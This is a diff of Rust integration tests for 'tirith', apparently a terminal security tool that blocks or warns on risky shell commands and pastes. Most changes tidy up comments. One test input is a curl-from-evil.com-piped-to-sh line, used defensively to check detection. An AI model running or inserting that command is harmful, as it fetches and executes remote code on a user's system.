@@ -9,12 +9,9 @@ use std::process::Command;
 
 fn tirith() -> Command {
     let mut cmd = Command::new(env!("CARGO_BIN_EXE_tirith"));
-    // Clear bypass env
     cmd.env_remove("TIRITH");
     cmd
 }
-
-// ─── check subcommand ───
 
 #[test]
 fn check_clean_command_allows() {
@@ -212,8 +209,6 @@ fn check_powershell_invoke_expression_blocks() {
     assert_eq!(out.status.code(), Some(1));
 }
 
-// ─── paste subcommand ───
-
 #[test]
 fn paste_clean_text_allows() {
     let out = tirith()
@@ -221,7 +216,6 @@ fn paste_clean_text_allows() {
         .stdin(std::process::Stdio::piped())
         .output()
         .expect("failed to run tirith");
-    // Empty stdin → allow
     assert_eq!(out.status.code(), Some(0));
 }
 
@@ -236,7 +230,6 @@ fn paste_ansi_escape_blocks() {
         .spawn()
         .expect("failed to spawn tirith");
 
-    // Write ANSI escape sequence
     child
         .stdin
         .take()
@@ -349,8 +342,6 @@ fn paste_process_level_bypass_still_honored_with_interactive_flag() {
     );
 }
 
-// ─── score subcommand ───
-
 #[test]
 fn score_clean_url() {
     let out = tirith()
@@ -366,7 +357,7 @@ fn score_suspicious_url() {
         .args(["score", "https://bit.ly/abc123"])
         .output()
         .expect("failed to run tirith");
-    // Should complete with exit 0 (score always returns 0)
+    // `score` always exits 0 even when findings are reported.
     assert_eq!(out.status.code(), Some(0));
 }
 
@@ -382,15 +373,13 @@ fn score_json_output() {
     assert!(json.get("findings").is_some());
 }
 
-// ─── why subcommand ───
-
 #[test]
 fn why_no_trigger() {
     let out = tirith()
         .args(["why"])
         .output()
         .expect("failed to run tirith");
-    // May exit 1 if no last_trigger.json exists, that's fine
+    // Exits 1 when no last_trigger.json exists — treat that as success here.
     assert!(
         out.status.code() == Some(0) || out.status.code() == Some(1),
         "why should exit 0 or 1"
@@ -447,8 +436,6 @@ fn check_wrapped_tirith_run_preserves_sink_rules() {
     }
 }
 
-// ─── init subcommand ───
-
 #[test]
 fn init_zsh_output() {
     let out = tirith()
@@ -457,7 +444,6 @@ fn init_zsh_output() {
         .expect("failed to run tirith");
     assert_eq!(out.status.code(), Some(0));
     let stdout = String::from_utf8_lossy(&out.stdout);
-    // Should output sourceable shell code or instructions
     assert!(
         stdout.contains("zsh-hook.zsh") || stdout.contains("source"),
         "init --shell zsh should reference zsh hook"
@@ -544,7 +530,8 @@ fn embedded_shell_hooks_match_repo_hooks() {
     let repo_dir = manifest_dir.join("../../shell/lib");
 
     if !repo_dir.exists() {
-        // Skip outside workspace layout (e.g. crate-only package test).
+        // Skip when running outside the workspace (e.g. a crate-only
+        // package test where shell/lib is not present).
         return;
     }
 
@@ -566,8 +553,6 @@ fn embedded_shell_hooks_match_repo_hooks() {
     }
 }
 
-// ─── Tier 1 early exit (no I/O) ───
-
 #[test]
 fn tier1_exit_fast_for_ls() {
     let out = tirith()
@@ -577,7 +562,6 @@ fn tier1_exit_fast_for_ls() {
     assert_eq!(out.status.code(), Some(0));
     let stdout = String::from_utf8_lossy(&out.stdout);
     let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
-    // Tier reached should be 1 (early exit)
     assert_eq!(json["tier_reached"], 1, "ls should exit at Tier 1");
 }
 
@@ -602,8 +586,6 @@ fn tier3_reached_for_curl() {
     );
 }
 
-// ─── TIRITH=0 bypass ───
-
 #[test]
 fn bypass_in_interactive_mode() {
     let out = tirith()
@@ -620,11 +602,10 @@ fn bypass_in_interactive_mode() {
         .expect("failed to run tirith");
     let stdout = String::from_utf8_lossy(&out.stdout);
     let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
-    // Bypass may or may not be honored depending on policy defaults
+    // Whether the bypass is honored depends on policy; assert only that
+    // the request was recorded in the envelope.
     assert!(json.get("bypass_requested").is_some());
 }
-
-// ─── observability fields ───
 
 #[test]
 fn json_includes_observability() {
@@ -641,13 +622,10 @@ fn json_includes_observability() {
         .expect("failed to run tirith");
     let stdout = String::from_utf8_lossy(&out.stdout);
     let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
-    // Check observability fields exist
     assert!(json.get("timings_ms").is_some());
     assert!(json.get("tier_reached").is_some());
     assert!(json.get("urls_extracted_count").is_some());
 }
-
-// ─── diff subcommand ───
 
 #[test]
 fn diff_url() {
@@ -658,22 +636,17 @@ fn diff_url() {
     assert_eq!(out.status.code(), Some(0));
 }
 
-// ─── receipt subcommand ───
-
 #[test]
 fn receipt_list_empty() {
     let out = tirith()
         .args(["receipt", "list"])
         .output()
         .expect("failed to run tirith");
-    // Should succeed even with no receipts
     assert!(
         out.status.code() == Some(0) || out.status.code() == Some(1),
         "receipt list should work"
     );
 }
-
-// ─── CR paste normalization ───
 
 #[cfg(unix)]
 #[test]
@@ -746,8 +719,6 @@ fn paste_windows_crlf_allows() {
         "Windows \\r\\n line endings should not trigger block"
     );
 }
-
-// ─── Bash hook mode selection ───
 
 #[cfg(unix)]
 #[test]
@@ -839,7 +810,8 @@ fn bash_hook_prompt_hook_reattaches() {
         "{}/assets/shell/lib/bash-hook.bash",
         env!("CARGO_MANIFEST_DIR")
     );
-    // Source hook, overwrite PROMPT_COMMAND, call ensure, check re-attached
+    // Source the hook, overwrite PROMPT_COMMAND, call the ensure helper,
+    // and verify it re-attached.
     let script = format!(
         "source '{hook}'; PROMPT_COMMAND='other_fn'; _tirith_ensure_prompt_hook; [[ \"$PROMPT_COMMAND\" == *_tirith_prompt_hook* ]] && printf 'reattached' || printf 'missing'"
     );
@@ -855,8 +827,6 @@ fn bash_hook_prompt_hook_reattaches() {
         "_tirith_ensure_prompt_hook should reattach when overwritten"
     );
 }
-
-// ─── Startup gate degrade + persistence ───
 
 #[cfg(unix)]
 fn expect_available() -> bool {
@@ -895,10 +865,10 @@ fn bash_hook_startup_gate_degrade_persists() {
         env!("CARGO_MANIFEST_DIR")
     );
 
-    // Step 1: Source hook in interactive bash with forced health gate failure.
-    // `bash --norc --noprofile -i -c` gives interactive context so enter mode activates
-    // without loading user config (which may set _TIRITH_BASH_LOADED).
-    // _TIRITH_TEST_FAIL_HEALTH=1 forces the health gate to fail.
+    // `bash --norc --noprofile -i -c` is interactive enough for enter mode
+    // to activate while skipping user config that might set
+    // _TIRITH_BASH_LOADED. _TIRITH_TEST_FAIL_HEALTH=1 forces the startup
+    // health gate to fail.
     let script =
         format!("_TIRITH_TEST_FAIL_HEALTH=1; source '{hook}'; printf '%s' \"$_TIRITH_BASH_MODE\"");
     let out = Command::new("bash")
@@ -917,14 +887,13 @@ fn bash_hook_startup_gate_degrade_persists() {
         "health gate failure should degrade to preexec"
     );
 
-    // Step 2: Verify safe-mode flag was persisted
     let flag = tmpdir.path().join("tirith/bash-safe-mode");
     assert!(
         flag.exists(),
         "safe-mode flag should be persisted after degrade"
     );
 
-    // Step 3: Source hook in new shell — should start in preexec from flag
+    // Re-source in a fresh shell; the persisted flag forces preexec.
     let script2 = format!(
         "unset TIRITH_BASH_MODE; unset SSH_CONNECTION; unset SSH_TTY; unset SSH_CLIENT; source '{hook}'; printf '%s' \"$_TIRITH_BASH_MODE\""
     );
@@ -959,10 +928,13 @@ fn bash_hook_runtime_delivery_failure_degrades_in_pty() {
         env!("CARGO_MANIFEST_DIR")
     );
 
-    // Exercise the runtime _tirith_enter failure path in a real interactive PTY:
-    // 1) Start in enter mode (startup gate bypassed for this test only).
-    // 2) Break PROMPT_COMMAND delivery by making it readonly without tirith hook.
-    // 3) Press Enter on a command and verify auto-degrade message appears.
+    // Drive the runtime _tirith_enter failure path in a real interactive
+    // PTY:
+    //   1. start in enter mode (startup gate bypassed for this test),
+    //   2. break PROMPT_COMMAND delivery by making it readonly without the
+    //      tirith hook,
+    //   3. press Enter on a command and assert the auto-degrade message
+    //      appears.
     let expect_script = r#"
 set timeout 20
 set hook $env(HOOK_PATH)
@@ -1012,8 +984,6 @@ expect eof
         "runtime delivery failure should persist safe-mode flag"
     );
 }
-
-// ─── Non-interactive policy tests ───
 
 #[cfg(unix)]
 #[test]
@@ -1089,15 +1059,12 @@ fn bash_hook_noninteractive_mode_is_enter() {
     );
 }
 
-// ─── Auto-checkpoint purge wiring (#61) ───
-
 #[test]
 fn auto_checkpoint_cli_wiring_compiles_and_runs() {
-    // Smoke test: verify that `tirith check --interactive` with a destructive
-    // command invokes the auto-checkpoint path without error.  The actual
-    // create-then-purge logic is tested in tirith_core::checkpoint::tests
-    // (test_create_and_purge_removes_expired).  This test only ensures the
-    // CLI wiring compiles and the subprocess exits cleanly.
+    // Smoke test for the auto-checkpoint CLI wiring. The create-then-purge
+    // logic is covered by `tirith_core::checkpoint::tests`; here we only
+    // confirm `tirith check --interactive` invokes that path cleanly on a
+    // destructive command.
     let tmpdir = tempfile::tempdir().expect("failed to create tmpdir");
     let workdir = tmpdir.path().join("project");
     fs::create_dir_all(&workdir).unwrap();
@@ -1126,8 +1093,6 @@ fn auto_checkpoint_cli_wiring_compiles_and_runs() {
         "auto-checkpoint should not report errors, got: {stderr}"
     );
 }
-
-// ─── Security audit fix tests ───
 
 #[cfg(unix)]
 fn prepare_read_only_audit_log() -> (tempfile::TempDir, PathBuf) {
@@ -1345,7 +1310,6 @@ fn paste_oversized_input_rejected() {
         .spawn()
         .expect("failed to spawn tirith");
 
-    // Write >1 MiB of data
     let data = vec![b'A'; 1024 * 1024 + 100];
     child.stdin.take().unwrap().write_all(&data).unwrap();
 
@@ -1376,12 +1340,10 @@ fn receipt_verify_invalid_sha256_rejected() {
     );
 }
 
-// ─── Fail-safe regression tests (unexpected exit code) ───
-
 #[cfg(unix)]
 #[test]
 fn bash_hook_unexpected_rc_logic_test() {
-    // Pure structural test: verify the if/elif/else branching for exit codes
+    // Pure structural check of the if/elif/else branching for exit codes.
     let script = r#"
 for rc in 0 1 2 137; do
   if [[ $rc -eq 0 ]]; then
@@ -1412,7 +1374,6 @@ done
 #[cfg(unix)]
 #[test]
 fn zsh_unexpected_rc_branch_logic_test() {
-    // Structural test: verify zsh branching pattern
     let script = r#"
 rc=137
 if [[ $rc -eq 0 ]]; then echo ALLOW
@@ -1438,7 +1399,6 @@ else echo UNEXPECTED; fi
 #[cfg(unix)]
 #[test]
 fn fish_unexpected_rc_branch_logic_test() {
-    // Structural test: verify fish branching pattern
     let script = r#"set rc 137
 if test $rc -eq 0; echo ALLOW
 else if test $rc -eq 2; echo WARN
@@ -1478,7 +1438,6 @@ fn bash_hook_unexpected_rc_degrades_in_pty() {
     );
     let marker = tmpdir.path().join("marker");
 
-    // Create a fake tirith that always exits 137
     let fake_tirith = tmpdir.path().join("tirith");
     fs::write(&fake_tirith, "#!/bin/sh\nexit 137\n").unwrap();
     #[cfg(unix)]
@@ -1535,25 +1494,21 @@ expect eof
 
     let stdout = String::from_utf8_lossy(&out.stdout);
 
-    // Marker file should NOT exist (command was blocked/preserved)
     assert!(
         !marker.exists(),
         "marker file should not exist — command should not have executed"
     );
 
-    // Output should mention unexpected exit code or switching to preexec
     assert!(
         stdout.contains("unexpected exit code") || stdout.contains("switching to preexec"),
         "output should mention degrade reason, got:\n{stdout}"
     );
 
-    // Mode should have degraded to preexec
     assert!(
         stdout.contains("MODE=preexec"),
         "mode should degrade to preexec, got:\n{stdout}"
     );
 
-    // Safe-mode flag should be persisted
     let flag = tmpdir.path().join("state/tirith/bash-safe-mode");
     assert!(
         flag.exists(),
@@ -1561,9 +1516,7 @@ expect eof
     );
 }
 
-// ─── Escalation + session warnings integration ───
-
-/// Helper: build a tirith Command with session and state isolation.
+/// Build a tirith Command with session and state isolation.
 fn tirith_isolated(
     session_id: &str,
     state_dir: &std::path::Path,
@@ -1594,13 +1547,12 @@ escalation:
 "#;
     fs::write(policy_dir.join("policy.yaml"), policy).unwrap();
 
-    // Also create a .git directory so policy discovery finds .tirith/policy.yaml
+    // Policy discovery walks up to `.git`, so seed one.
     fs::create_dir_all(tmpdir.path().join("project/.git")).unwrap();
 
     let session_id = format!("test-escalation-{}", std::process::id());
     let project_dir = tmpdir.path().join("project");
 
-    // Command 1: should warn (exit 2)
     let out1 = tirith_isolated(&session_id, &state_dir, &project_dir)
         .args([
             "check",
@@ -1620,7 +1572,6 @@ escalation:
         String::from_utf8_lossy(&out1.stderr)
     );
 
-    // Command 2: should warn (exit 2)
     let out2 = tirith_isolated(&session_id, &state_dir, &project_dir)
         .args([
             "check",
@@ -1640,7 +1591,6 @@ escalation:
         String::from_utf8_lossy(&out2.stderr)
     );
 
-    // Command 3: should block (exit 1) due to escalation (threshold=3)
     let out3 = tirith_isolated(&session_id, &state_dir, &project_dir)
         .args([
             "check",
@@ -1682,7 +1632,6 @@ escalation:
     let session_id = format!("test-blocked-warn-{}", std::process::id());
     let project_dir = tmpdir.path().join("project");
 
-    // Run 3 commands: 2 warn, 1 block
     for slug in &["aaa", "bbb", "ccc"] {
         let _ = tirith_isolated(&session_id, &state_dir, &project_dir)
             .args([
@@ -1698,7 +1647,6 @@ escalation:
             .expect("failed to run tirith");
     }
 
-    // Query warnings as JSON
     let out = tirith_isolated(&session_id, &state_dir, &project_dir)
         .args(["warnings", "--json", "--session", &session_id])
         .output()
@@ -1729,7 +1677,6 @@ fn warnings_clear_resets_session() {
     let session_id = format!("test-clear-{}", std::process::id());
     let project_dir = tmpdir.path().join("project");
 
-    // Generate a warning
     let out = tirith_isolated(&session_id, &state_dir, &project_dir)
         .args([
             "check",
@@ -1748,7 +1695,6 @@ fn warnings_clear_resets_session() {
         "shortened URL should warn (exit 2)"
     );
 
-    // Verify warning is recorded
     let out = tirith_isolated(&session_id, &state_dir, &project_dir)
         .args(["warnings", "--json", "--session", &session_id])
         .output()
@@ -1760,14 +1706,12 @@ fn warnings_clear_resets_session() {
         "should have at least one warning before clear"
     );
 
-    // Clear session
     let out = tirith_isolated(&session_id, &state_dir, &project_dir)
         .args(["warnings", "--clear", "--session", &session_id])
         .output()
         .expect("failed to run tirith warnings --clear");
     assert_eq!(out.status.code(), Some(0));
 
-    // Verify session is empty
     let out = tirith_isolated(&session_id, &state_dir, &project_dir)
         .args(["warnings", "--json", "--session", &session_id])
         .output()
@@ -1788,7 +1732,7 @@ fn paranoia_filters_low_finding_to_allow() {
     fs::create_dir_all(&policy_dir).unwrap();
     fs::create_dir_all(&state_dir).unwrap();
 
-    // Override shortened_url to LOW severity + paranoia 1 filters out LOW
+    // paranoia 1 + LOW override for shortened_url filters the finding out.
     let policy = r#"paranoia: 1
 severity_overrides:
   shortened_url: LOW
@@ -1818,10 +1762,6 @@ severity_overrides:
         String::from_utf8_lossy(&out.stderr)
     );
 }
-
-// ---------------------------------------------------------------------------
-// #77: --warn-only human rendering
-// ---------------------------------------------------------------------------
 
 #[test]
 fn check_warn_only_block_renders_as_detected() {
@@ -1878,9 +1818,9 @@ fn check_without_warn_only_still_renders_blocked() {
 
 #[test]
 fn warn_only_json_output_matches_plain_when_timings_stripped() {
-    // The --warn-only flag only affects human rendering. Machine output (JSON,
-    // audit, webhook) must be byte-identical to the un-flagged run after
-    // normalizing out the per-run `timings_ms` field.
+    // The --warn-only flag only affects human rendering. Machine output
+    // (JSON, audit, webhook) must be byte-identical to the un-flagged run
+    // after stripping the per-run `timings_ms` field.
     let input = "curl http://evil.com/x.sh | sh";
     let with_flag = tirith()
         .args([
